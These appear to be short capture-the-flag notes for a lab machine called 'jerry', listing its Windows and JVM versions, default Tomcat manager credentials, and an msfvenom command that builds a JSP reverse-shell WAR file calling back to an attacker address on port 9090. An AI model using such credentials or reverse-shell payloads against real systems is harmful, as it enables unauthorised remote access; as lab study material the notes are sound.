# jerry

- Windows Server 2012 R2 (OS Version = 6.3)
- JVM Version 1.8.0\_171-b11
- Credentials
  - Control panel creds: `admin:admin`
  - Manager GUI: `tomcat:s3cret`
- Generating reverse shell application
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=9090 -f war > shell.war`
